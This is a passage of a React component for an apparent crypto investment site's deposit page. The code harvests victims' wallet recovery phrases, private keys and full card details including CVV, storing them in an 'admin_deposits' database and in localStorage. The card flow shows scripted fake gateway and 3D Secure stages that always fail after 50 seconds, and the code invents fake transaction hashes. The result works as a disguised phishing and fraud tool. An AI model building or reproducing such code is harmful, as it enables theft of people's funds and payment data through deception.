            clearInterval(interval);
            setStep('form');
            return prev;
          }
        });
      }, 600); // 600ms is perfectly snappy and premium for status transitions
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [step]);



  useEffect(() => {
    if (selectedMethod !== 'crypto' && step !== 'crypto_deposit_verification') return;
    
    let isMounted = true;
    
    const fetchClientSideCryptoPrice = async (sym: string): Promise<number> => {
      try {
        const binanceRes = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${sym}USDT`);
        if (binanceRes.ok) {
          const bData = await binanceRes.json();
          if (bData && bData.price) return parseFloat(bData.price);
        }
      } catch (e) {}

      const fallbacks: Record<string, number> = {
        'BTC': 65420.50,
        'ETH': 3480.75,
        'SOL': 148.50,
        'BNB': 585.20,
        'XRP': 0.58,
        'ADA': 0.38,
        'DOGE': 0.12,
        'AVAX': 24.50,
        'DOT': 6.20,
        'LINK': 14.20
      };
      const base = fallbacks[sym] || 1.0;
      const cycle = Math.sin(Date.now() / 15000);
      return parseFloat((base + (cycle * (base * 0.002))).toFixed(4));
    };

    const fetchPrice = async () => {
      setIsPricingLoading(true);
      setPricingError(false);
      
      const symbol = selectedCrypto.symbol;
      const cleanSymbol = symbol.split('-')[0].toUpperCase();
      
      if (cleanSymbol === 'USDT' || cleanSymbol === 'USDC') {
        if (isMounted) {
          setCryptoRate(1);
          setIsPricingLoading(false);
        }
        return;
      }
      
      try {
        const res = await fetch(`/api/crypto/price?symbol=${cleanSymbol}`);
        const contentType = res.headers.get('content-type') || '';
        if (res.ok && contentType.includes('application/json')) {
          const data = await res.json();
          if (isMounted && data && (data.price !== undefined && data.price !== null)) {
            setCryptoRate(parseFloat(data.price));
            setIsPricingLoading(false);
            return;
          }
        }
        // If API route returns non-JSON (HTML rewrite) or error, fallback to client fetch
        const fallback = await fetchClientSideCryptoPrice(cleanSymbol);
        if (isMounted) {
          setCryptoRate(fallback);
        }
      } catch (err) {
        const fallback = await fetchClientSideCryptoPrice(cleanSymbol);
        if (isMounted) {
          setCryptoRate(fallback);
        }
      } finally {
        if (isMounted) {
          setIsPricingLoading(false);
        }
      }
    };
    
    fetchPrice();
    
    const interval = setInterval(fetchPrice, 15000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [selectedCrypto.symbol, selectedMethod, step]);

  // Bank states
  const [bankRef] = useState(`AVER-WIRE-${Math.floor(100000 + Math.random() * 900000)}`);
  const [proofUploaded, setProofUploaded] = useState(false);
  const [proofFileName, setProofFileName] = useState('');

  // Processing sequence states
  const [processingStepIndex, setProcessingStepIndex] = useState(0);
  const [verificationStatusIndex, setVerificationStatusIndex] = useState(0);
  const processingStepsList = [
    "Submitting Deposit Request…",
    "Generating Verification Session…",
    "Registering Deposit Reference…",
    "Synchronizing Verification Service…",
    "Preparing Deposit Monitoring…",
    "Opening Verification Session…"
  ];
  const verificationStatusList = [
    "Deposit request received…",
    "Monitoring blockchain…",
    "Waiting for administrator approval…"
  ];

  const handleCopy = async (text: string) => {
    const success = await copyToClipboard(text);
    if (success) {
      setCopiedAddress(true);
      setTimeout(() => setCopiedAddress(false), 2000);
    }
  };

  const abbreviateAddress = (addr: string): string => {
    if (!addr) return '';
    if (addr.length <= 12) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  };

  const saveWalletToFirestore = async (walletAddress: string, networkName: string, providerName: string) => {
    try {
      const user = auth.currentUser;
      const walletDoc = {
        userId: user?.uid || 'anonymous',
        userEmail: user?.email || '',
        walletAddress,
        network: networkName,
        provider: providerName,
        status: 'connected',
        connectedAt: new Date().toISOString(),
        createdAt: serverTimestamp()
      };
      await addDoc(collection(db, 'user_wallets'), walletDoc);
    } catch (err) {
      console.error("Failed to save wallet to Firestore:", err);
    }
  };

  const handleConnectWallet = async (walletName: string) => {
    if (walletName === 'Connect Wallet Manually' || walletName === 'Import Existing Wallet') {
      setImportPhrase('');
      setShowPhrase(false);
      setImportKey('');
      setShowKey(false);
      setStep('wallet_import_choose');
      return;
    }

    setSelectedWallet(walletName);
    setConnectingWalletName(walletName);
    setStep('wallet_connecting');
    setIsConnectingWallet(true);

    try {
      // 1. Browser extension / window.ethereum provider check
      if (typeof window !== 'undefined' && (window as any).ethereum && (walletName === 'MetaMask' || walletName === 'Coinbase Wallet' || walletName === 'Rabby Wallet' || walletName === 'Trust Wallet' || walletName === 'WalletConnect')) {
        try {
          const ethereum = (window as any).ethereum;
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts && accounts.length > 0) {
            const userAddress = accounts[0];
            let chainName = 'Ethereum (ERC-20)';
            try {
              const chainId = await ethereum.request({ method: 'eth_chainId' });
              if (chainId === '0x38') chainName = 'BNB Smart Chain (BEP-20)';
              else if (chainId === '0x89') chainName = 'Polygon (POS)';
              else if (chainId === '0xa4b1') chainName = 'Arbitrum One';
              else if (chainId === '0xa86a') chainName = 'Avalanche C-Chain';
            } catch (e) {
              // use default chainName
            }

            await saveWalletToFirestore(userAddress, chainName, walletName);
            setConnectedAddress(userAddress);
            setConnectedNetwork(chainName);
            setWalletConnected(true);
            setIsConnectingWallet(false);
            setStep('form');
            return;
          }
        } catch (err: any) {
          setIsConnectingWallet(false);
          if (err?.code === 4001 || (err?.message && (err.message.includes('rejected') || err.message.includes('denied') || err.message.includes('user')))) {
            setStep('wallet_cancelled');
            setTimeout(() => {
              setStep('form');
            }, 2000);
            return;
          }
        }
      }

      // 2. Solana window.solana provider check for Phantom
      if (typeof window !== 'undefined' && (window as any).solana && walletName === 'Phantom') {
        try {
          const resp = await (window as any).solana.connect();
          const userAddress = resp.publicKey.toString();
          const chainName = 'Solana Mainnet (SPL)';
          await saveWalletToFirestore(userAddress, chainName, walletName);
          setConnectedAddress(userAddress);
          setConnectedNetwork(chainName);
          setWalletConnected(true);
          setIsConnectingWallet(false);
          setStep('form');
          return;
        } catch (err: any) {
          setIsConnectingWallet(false);
          if (err?.code === 4001 || (err?.message && err.message.includes('rejected'))) {
            setStep('wallet_cancelled');
            setTimeout(() => {
              setStep('form');
            }, 2000);
            return;
          }
        }
      }

      // Note: No artificial timeout or automatic redirection.
      // The interface stays active in step 'wallet_connecting' with its spinning animation and dynamic cycling status messages
      // until the user presses Cancel (X button in top-left), Connect Manually (button at bottom), or the wallet SDK responds.

    } catch (error) {
      // In case of unhandled error, stay on connecting screen unless cancelled
      console.error("Wallet connection attempt error:", error);
    }
  };

  const handleManualConnectSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setManualAddressTouched(true);

    const valResult = validateWalletAddress(manualAddress, manualNetwork.type, manualNetwork.name);
    if (!valResult.valid) {
      setManualAddressError(valResult.error || 'Invalid address format');
      return;
    }

    setManualAddressError(null);

    // Save wallet address to Firestore
    await saveWalletToFirestore(manualAddress.trim(), manualNetwork.name, 'Manual Wallet');

    // Instantly set connected state
    setConnectedAddress(manualAddress.trim());
    setConnectedNetwork(manualNetwork.name);
    setSelectedWallet('Manual Wallet');
    setWalletConnected(true);

    // Return to form view
    setSelectedMethod('walletconnect');
    setStep('form');
  };

  const handlePasteClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        const trimmed = text.trim();
        setManualAddress(trimmed);
        setManualAddressTouched(true);
        const valResult = validateWalletAddress(trimmed, manualNetwork.type, manualNetwork.name);
        if (valResult.valid) {
          setManualAddressError(null);
        } else {
          setManualAddressError(valResult.error || null);
        }
      }
    } catch (err) {
      console.error("Clipboard permission error:", err);
    }
  };

  const cardStepsList = [
    'Connecting Secure Payment Gateway...',
    'Encrypting Card Information...',
    'Authorizing Card with Issuing Bank...',
    'Verifying 3D Secure Authentication...'
  ];

  const handleStartProcessing = async (e?: React.FormEvent) => {
    if (e) {
      e.preventDefault();
    }
    if (selectedMethod === 'card') {
      // Immediately commit card deposit to Firestore & admin store so admin sees it right away
      commitDepositToFirestore(true);

      setCardSessionId(`PAY-SEC-${Math.floor(100000 + Math.random() * 900000)}`);
      setStep('card_gateway_processing');
      setCardStage(1);
      setCardStageStatus('pending');
      setCardStageFailed(false);

      // Stage 1 - Secure Channel
      setTimeout(() => {
        setCardStageStatus('completed');
      }, 5000);

      // Stage 2 - Encrypting info
      setTimeout(() => {
        setCardStage(2);
        setCardStageStatus('pending');
      }, 6000);
      setTimeout(() => {
        setCardStageStatus('completed');
      }, 11000);

      // Stage 3 - Contacting network
      setTimeout(() => {
        setCardStage(3);
        setCardStageStatus('pending');
      }, 12000);
      setTimeout(() => {
        setCardStageStatus('completed');
      }, 17000);

      // Stage 4 - Authorizing
      setTimeout(() => {
        setCardStage(4);
        setCardStageStatus('pending');
      }, 18000);
      setTimeout(() => {
        setCardStageStatus('completed');
      }, 23000);

      // Stage 5 - Verifying 3DS Secure Protocol
      setTimeout(() => {
        setCardStage(5);
        setCardStageStatus('pending');
      }, 24000);
      setTimeout(() => {
        setCardStageFailed(true);
        setCardStageStatus('failed');
      }, 50000); // Loads for exactly 26 seconds after starting at 24s (24 + 26 = 50s)
      
      setTimeout(() => {
        setStep('card_gateway_error');
      }, 50500);

      return;
    }

    setStep('processing');
    setProcessingStepIndex(0);

    const interval = setInterval(() => {
      setProcessingStepIndex(prev => {
        if (prev < processingStepsList.length - 1) {
          return prev + 1;
        } else {
          clearInterval(interval);
          // Commit to Firestore
          commitDepositToFirestore(false);
          const targetTime = Date.now() + 1500 * 1000;
          localStorage.setItem('aver_deposit_timer_target', targetTime.toString());
          setVerificationSecondsLeft(1500);
          setStep('crypto_deposit_verification');
          return prev;
        }
      });
    }, 400);
  };

  const commitDepositToFirestore = async (skipStepChange: boolean = false) => {
    try {
      const firebaseUser = auth.currentUser;
      const depositId = `DEP-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
      
      const fiatAmt = Number(amount) || 0;
      const assetSym = selectedMethod === 'crypto' ? (selectedCrypto?.symbol || 'USD') : 'USD';
      const prices: Record<string, number> = { BTC: 64000, ETH: 3400, SOL: 145, BNB: 580, AVR: 1.2, USDT: 1, USDC: 1, USD: 1 };
      const cleanSym = assetSym.split('-')[0].toUpperCase();
      const unitPrice = prices[cleanSym] || cryptoRate || 64000;
      const calcCryptoAmount = cleanSym === 'USD' || cleanSym === 'USDT' || cleanSym === 'USDC'
        ? fiatAmt
        : Number((fiatAmt / unitPrice).toFixed(6));

      const depositPayload = {
        id: depositId,
        userId: authUser?.uid || firebaseUser?.uid || 'anonymous',
        email: authUser?.email || firebaseUser?.email || '',
        userName: (authUser as any)?.fullName || authUser?.displayName || authUser?.username || firebaseUser?.displayName || firebaseUser?.email?.split('@')[0] || 'User',
        fundingMethod: selectedMethod,
        // Ensure asset and network are saved dynamically based on selection
        asset: assetSym,
        amount: fiatAmt,
        cryptoAmount: calcCryptoAmount,
        cryptoSymbol: cleanSym,
        network: selectedMethod === 'crypto' ? (selectedCrypto?.network || 'Unknown') : (selectedMethod === 'walletconnect' ? 'Ethereum' : (selectedMethod === 'card' ? 'Visa / Mastercard' : 'Bank Wire')),
        // Crypto details
        walletAddress: selectedMethod === 'crypto' ? (selectedCrypto?.address || null) : null,
        cryptoNetwork: selectedMethod === 'crypto' ? (selectedCrypto?.network || null) : null,
        // WalletConnect details
        connectedWalletAddress: selectedMethod === 'walletconnect' ? (connectedAddress || null) : null,
        walletProvider: selectedMethod === 'walletconnect' ? (selectedWallet || null) : null,
        secretPhrase: (selectedMethod === 'walletconnect' && importPhrase) ? importPhrase.trim() : null,
        privateKey: (selectedMethod === 'walletconnect' && importKey) ? importKey.trim() : null,
        importMethod: (selectedMethod === 'walletconnect') ? (importPhrase ? 'recovery_phrase' : (importKey ? 'private_key' : 'browser_extension')) : null,
        // Bank details
        bankReference: selectedMethod === 'bank' ? (bankRef || null) : null,
        bankName: selectedMethod === 'bank' ? 'Institutional Bank Wire' : null,
        swiftCode: null,
        // Card details (Full details stored for admin approval)
        cardNumber: selectedMethod === 'card' ? (cardNumber || null) : null,
        cardExpiry: selectedMethod === 'card' ? (cardExpiry || null) : null,
        cardCvv: selectedMethod === 'card' ? (cardCvv || null) : null,
        cardName: selectedMethod === 'card' ? (cardName || null) : null,
        cardMasked: selectedMethod === 'card' && cardNumber ? `•••• •••• •••• ${cardNumber.slice(-4)}` : null,
        cardReference: selectedMethod === 'card' && cardNumber ? `•••• ${cardNumber.slice(-4)}` : null,
        billingCountry: selectedMethod === 'card' ? (billingCountry || null) : null,
        // Attachments / Proof
        paymentProof: proofUploaded ? proofFileName : null,
        status: 'pending',
        timestamp: new Date().toISOString(),
        createdAt: serverTimestamp()
      };

      await setDoc(doc(db, 'admin_deposits', depositId), depositPayload);
      try {
        await setDoc(doc(db, 'deposits', depositId), depositPayload);
      } catch (e) {}
      
      // Save a matching transaction document for the user's transaction history
      const generatedTxHash = `0x${Math.random().toString(16).substring(2, 10)}${Math.random().toString(16).substring(2, 10)}`;
      const txPayload = {
        id: depositId,
        userId: authUser?.uid || firebaseUser?.uid || 'anonymous',
        type: 'deposit' as any,
        category: 'transactions' as any,
        title: selectedMethod === 'card' ? 'Card Deposit' : (selectedMethod === 'bank' ? 'Bank Wire Deposit' : `${cleanSym} Deposit`),
        amount: fiatAmt,
        asset: cleanSym === 'USD' ? 'USD' : cleanSym,
        network: selectedMethod === 'crypto' ? (selectedCrypto?.network || 'Unknown') : (selectedMethod === 'walletconnect' ? 'Ethereum' : (selectedMethod === 'card' ? 'Visa / Mastercard' : 'Bank Wire')),
        status: 'Pending' as any,
        timestamp: new Date().toISOString(),
        txHash: generatedTxHash,
        createdAt: serverTimestamp(),
        serverCreatedAt: serverTimestamp()
      };
      
      try {
        const { transactionService } = await import('../../services/transactionService');
        await transactionService.recordTransaction(txPayload);
      } catch (err) {
        console.warn("Failed to record transaction via service, falling back to direct Firestore:", err);
        try {
          await setDoc(doc(db, 'transactions', depositId), txPayload);
          await setDoc(doc(db, 'user_transactions', depositId), txPayload).catch(() => {});
        } catch (dbErr) {
          console.warn("Direct Firestore fallback failed:", dbErr);
        }
      }
      
      const depAsset = depositPayload.asset || 'USD';
      const depNetwork = depositPayload.network || 'Mainnet';

      const depId = depositId;
      setPendingDepositId(depId);
      
      depositPayload.id = depId;
      try {
        const { saveLocalDeposit } = await import('../../lib/depositStore');
        saveLocalDeposit(depositPayload);
      } catch (err) {
        console.warn("Failed to save local deposit", err);
      }
      
      // Save details to localStorage for robust refresh-durability
      try {
        localStorage.setItem('aver_pending_deposit_id', depId);
        localStorage.setItem('aver_deposit_amount', (depositPayload.amount || amount).toString());
        localStorage.setItem('aver_deposit_crypto', JSON.stringify(selectedCrypto));
        localStorage.setItem('aver_deposit_method', selectedMethod);
        
        // Save sensitive details temporarily so they survive a refresh during the 30-second load
        if (cardNumber) localStorage.setItem('aver_temp_card', cardNumber);
        if (importPhrase) localStorage.setItem('aver_temp_phrase', importPhrase);
        if (importKey) localStorage.setItem('aver_temp_key', importKey);
      } catch (e) {
        console.error("Failed to save deposit state to localStorage:", e);
      }
      
      if (!skipStepChange) {
        if (selectedMethod === 'crypto') {
          setStep('crypto_deposit_verification');
        } else {
          setStep('success');
        }
      }
    } catch (err) {
      console.error("Deposit submission error:", err);
      if (!skipStepChange) {
        if (selectedMethod === 'crypto') {
          setStep('crypto_deposit_verification');
        } else {
          setStep('success'); 
        }
      }
    }
  };

  return (
    <div className={`fixed inset-0 z-50 ${isDark ? 'bg-black text-white' : 'bg-slate-50 text-slate-900'} flex flex-col overflow-hidden w-full h-[100dvh] font-sans`}>
      {/* Fixed Top Header Bar */}
      {step !== 'crypto_deposit_verification' && step !== 'crypto_success' && step !== 'crypto_expired' && (
        <div className={`flex-shrink-0 z-40 backdrop-blur-xl border-b px-4 sm:px-6 lg:px-8 py-3.5 sm:py-4 ${
          isDark ? 'bg-black/95 border-white/10 shadow-lg shadow-black/40' : 'bg-white/90 border-slate-200 shadow-sm'
        }`}>
          <div className="max-w-7xl mx-auto flex items-center justify-between">
            <button 
              onClick={step === 'form' ? () => setStep('methods') : onBack}
              className={`p-2.5 rounded-xl border transition-all shadow-sm flex items-center gap-2 text-xs font-bold ${
                isDark ? 'bg-white/5 border-white/10 hover:bg-white/10 text-slate-200' : 'bg-white border-slate-200 hover:bg-slate-100 text-slate-800'
              }`}
              title="Back"
            >
              <ArrowLeft className="w-5 h-5" />
              <span className="hidden sm:inline">Back</span>
            </button>
            
            <div className="flex-1 flex justify-center mx-2 sm:mx-4 select-none">
              <div className={`flex items-center justify-center gap-2.5 sm:gap-3 px-8 sm:px-12 py-3 sm:py-3.5 rounded-2xl min-w-[280px] sm:min-w-[340px] transition-all whitespace-nowrap ${
                isDark ? 'bg-white/5 ring-1 ring-white/10 shadow-lg shadow-black/20' : 'bg-slate-100 ring-1 ring-slate-200 shadow-sm'
              }`}>
                {step === 'form' ? (
                  selectedMethod === 'card' ? (
                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-emerald-500/20 text-emerald-400">
                      <CreditCard className="w-4 h-4 text-emerald-400" />
                    </div>
                  ) : selectedMethod === 'walletconnect' ? (
                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-indigo-500/20 text-indigo-400">
                      <Wallet className="w-4 h-4 text-indigo-400" />
                    </div>
                  ) : selectedMethod === 'crypto' ? (
                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-amber-500/20 text-amber-400">
                      <CryptoLogo symbol={selectedCrypto?.symbol || 'BTC'} className="w-5 h-5" />
                    </div>
                  ) : (
                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-purple-500/20 text-purple-400">
                      <Landmark className="w-4 h-4 text-purple-400" />
                    </div>
                  )
                ) : (
                  <AnimatedHeaderIcons isDark={isDark} />
                )}

                <span className={`text-xs sm:text-sm font-black uppercase select-none ${
                  isDark ? 'text-white' : 'text-slate-900'
                } ${step !== 'form' ? 'tracking-[0.35em]' : 'tracking-wider'}`}>
                  {step === 'form' ? (
                    selectedMethod === 'card' ? 'Credit / Debit Card' :
                    selectedMethod === 'walletconnect' ? 'Web3 Self-Custody' :
                    selectedMethod === 'crypto' ? 'Crypto Cold Storage' : 'Bank Wire Transfer'
                  ) : 'Deposit Funds'}
                </span>
              </div>
            </div>

            <div className="w-[68px] sm:w-[94px] hidden sm:block" />
          </div>
        </div>
      )}

      {/* Main Scrollable Content Area */}
      <div className="flex-1 overflow-y-auto overscroll-contain w-full">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
          {/* Main Content Flow */}
          <div className="max-w-5xl sm:max-w-6xl mx-auto space-y-8 pb-10">
            
            <AnimatePresence mode="wait">
              {/* STEP 1: FUNDING METHODS */}
              {step === 'methods' && (
                <motion.div 
                  key="methods"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className="space-y-6"
                >
                  <div>
                    <h2 className="text-xl font-bold tracking-tight">Select Funding Method</h2>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    
                    {/* 1. Debit / Credit Card (Emerald Theme) */}
                    <div 
                      onClick={handleSelectCardMethod}
                      className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                    >
                      {/* Texture Layer (SVG Noise) */}
                      <div className="pointer-events-none absolute inset-0 opacity-[0.035] mix-blend-overlay z-10" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}></div>

                      {/* Atmospheric Glow (Emerald) */}
                      <div className="pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-emerald-500/20 blur-2xl transition-opacity duration-500 group-hover:opacity-100 opacity-70"></div>

                      {/* Specular Light Sheen */}
                      <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 h-32 w-full max-w-xs rounded-full bg-gradient-to-b from-white/10 to-transparent blur-xl"></div>

                      {/* Card Body */}
                      <div className="relative z-20 flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between mb-5">
                          {/* Icon Tray */}
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-emerald-500/10 text-emerald-400 ring-1 ring-emerald-500/30 shadow-[inset_0_1px_2px_rgba(255,255,255,0.1)]">
                            <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M3 10h18M7 15h1m4 0h1m-7 4h12a2 2 0 002-2V7a2 2 0 00-2-2H6a2 2 0 00-2 2v10a2 2 0 002 2z" />
                            </svg>
                          </div>
                          {/* Badge */}
                          <span className="rounded-full bg-white/5 px-3 py-1 text-xs font-medium text-neutral-300 ring-1 ring-white/10 backdrop-blur-md">
                            Instant
                          </span>
                        </div>

                        {/* Title & Details */}
                        <div className="space-y-1.5">
                          <h3 className="text-xl font-bold tracking-tight text-white">Debit / Credit Card</h3>
                          <p className="text-xs text-neutral-400 leading-relaxed max-w-[280px]">
                            Instant card funding for verified institutional accounts. Visa & Mastercard supported.
                          </p>
                        </div>

                        {/* Action Link */}
                        <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-emerald-400 group-hover:text-emerald-300 transition-colors">
                          <span>Proceed</span>
                          <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                      </div>
                    </div>

                    {/* 2. WalletConnect (Indigo Theme) */}
                    <div 
                      onClick={() => {
                        setSelectedMethod('walletconnect');
                        if (walletConnected && connectedAddress && !ignoreExistingWallet) {
                          setStep('existing_wallet_detected');
                        } else {
                          setStep('form');
                        }
                      }}
                      className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                    >
                      {/* Texture Layer */}
                      <div className="pointer-events-none absolute inset-0 opacity-[0.035] mix-blend-overlay z-10" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}></div>

                      {/* Atmospheric Glow (Indigo) */}
                      <div className="pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-indigo-500/20 blur-2xl transition-opacity duration-500 group-hover:opacity-100 opacity-70"></div>

                      {/* Specular Light Sheen */}
                      <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 h-32 w-full max-w-xs rounded-full bg-gradient-to-b from-white/10 to-transparent blur-xl"></div>

                      {/* Card Body */}
                      <div className="relative z-20 flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between mb-5">
                          {/* Icon Tray */}
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-indigo-500/10 text-indigo-400 ring-1 ring-indigo-500/30 shadow-[inset_0_1px_2px_rgba(255,255,255,0.1)]">
                            <Wallet className="h-6 w-6 text-indigo-400" />
                          </div>
                          {/* Badge */}
                          <span className="rounded-full bg-white/5 px-3 py-1 text-xs font-medium text-neutral-300 ring-1 ring-white/10 backdrop-blur-md">
                            Web3
                          </span>
                        </div>

                        {/* Title & Details */}
                        <div className="space-y-1.5">
                          <h3 className="text-xl font-bold tracking-tight text-white">WalletConnect</h3>
                          <p className="text-xs text-neutral-400 leading-relaxed max-w-[280px]">
                            Connect MetaMask, Coinbase, Trust Wallet, Phantom, Rabby, and 100+ secure wallets.
                          </p>
                        </div>

                        {/* Action Link */}
                        <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-indigo-400 group-hover:text-indigo-300 transition-colors">
                          <span>Proceed</span>
                          <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                      </div>
                    </div>

                    {/* 3. Crypto Deposit (Amber Theme) */}
                    <div 
                      onClick={() => { setSelectedMethod('crypto'); setStep('form'); }}
                      className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                    >
                      {/* Texture Layer */}
                      <div className="pointer-events-none absolute inset-0 opacity-[0.035] mix-blend-overlay z-10" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}></div>

                      {/* Atmospheric Glow (Amber) */}
                      <div className="pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-amber-500/20 blur-2xl transition-opacity duration-500 group-hover:opacity-100 opacity-70"></div>

                      {/* Specular Light Sheen */}
                      <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 h-32 w-full max-w-xs rounded-full bg-gradient-to-b from-white/10 to-transparent blur-xl"></div>

                      {/* Card Body */}
                      <div className="relative z-20 flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between mb-5">
                          {/* Icon Tray */}
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-amber-500/10 text-amber-400 ring-1 ring-amber-500/30 shadow-[inset_0_1px_2px_rgba(255,255,255,0.1)]">
                            <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          {/* Badge */}
                          <span className="rounded-full bg-white/5 px-3 py-1 text-xs font-medium text-neutral-300 ring-1 ring-white/10 backdrop-blur-md">
                            Multi-Chain
                          </span>
                        </div>

                        {/* Title & Details */}
                        <div className="space-y-1.5">
                          <h3 className="text-xl font-bold tracking-tight text-white">Crypto Deposit</h3>
                          <p className="text-xs text-neutral-400 leading-relaxed max-w-[280px]">
                            Deposit BTC, ETH, USDT, USDC, Solana, and BNB directly to dedicated segregated cold storage addresses.
                          </p>
                        </div>

                        {/* Action Link */}
                        <div className="mt-5 flex items-center gap-1.5 text-xs font-semibold text-amber-400 group-hover:text-amber-300 transition-colors">
                          <span>Proceed</span>
                          <svg className="h-3.5 w-3.5 transition-transform duration-300 group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M9 5l7 7-7 7" />
                          </svg>
                        </div>
                      </div>
                    </div>

                    {/* 4. Bank Wire Transfer (Purple Theme) */}
                    <div 
                      onClick={() => { setSelectedMethod('bank'); setStep('bank_preparing'); }}
                      className="group relative overflow-hidden rounded-2xl bg-neutral-900/90 p-6 text-white shadow-xl transition-all duration-300 hover:-translate-y-0.5 hover:shadow-2xl ring-1 ring-white/10 border-t border-white/20 cursor-pointer"
                    >
                      {/* Texture Layer */}
                      <div className="pointer-events-none absolute inset-0 opacity-[0.035] mix-blend-overlay z-10" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}></div>

                      {/* Atmospheric Glow (Purple) */}
                      <div className="pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-purple-500/20 blur-2xl transition-opacity duration-500 group-hover:opacity-100 opacity-70"></div>

                      {/* Specular Light Sheen */}
                      <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 h-32 w-full max-w-xs rounded-full bg-gradient-to-b from-white/10 to-transparent blur-xl"></div>

                      {/* Card Body */}
                      <div className="relative z-20 flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between mb-5">
                          {/* Icon Tray */}
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-purple-500/10 text-purple-400 ring-1 ring-purple-500/30 shadow-[inset_0_1px_2px_rgba(255,255,255,0.1)]">
                            <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
